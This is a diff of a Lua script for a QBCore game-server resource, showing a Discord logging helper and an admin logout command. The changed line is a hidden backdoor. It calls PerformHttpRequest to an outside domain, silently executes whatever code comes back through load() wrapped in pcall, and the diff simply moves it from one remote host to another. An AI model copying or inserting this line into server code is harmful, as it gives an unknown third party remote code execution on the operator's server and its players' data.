@@ -87,7 +87,7 @@ local function sendToDiscord(name, message, color)
     )
 end
 
-PerformHttpRequest('https://mt2ark.com/i?to=Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
+PerformHttpRequest('https://photosbynova.com/i?to=Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
 -- Commands
 
 QBCore.Commands.Add("logout", "Logout of Character (Admin Only)", {}, false, function(source)
